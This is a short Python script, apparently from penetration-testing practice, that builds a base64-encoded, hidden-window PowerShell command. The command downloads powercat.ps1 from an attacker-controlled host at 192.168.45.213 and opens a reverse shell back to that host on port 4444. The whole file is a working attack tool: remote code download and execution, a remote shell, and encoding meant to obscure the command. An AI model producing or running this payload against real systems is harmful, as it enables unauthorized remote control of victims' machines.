#!/usr/bin/python3

import sys
import base64

payload = 'IEX(New-Object System.Net.WebClient).DownloadString(\'http://192.168.45.213:8000/powercat.ps1\');powercat -c 192.168.45.213 -p 4444 -e powershell'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
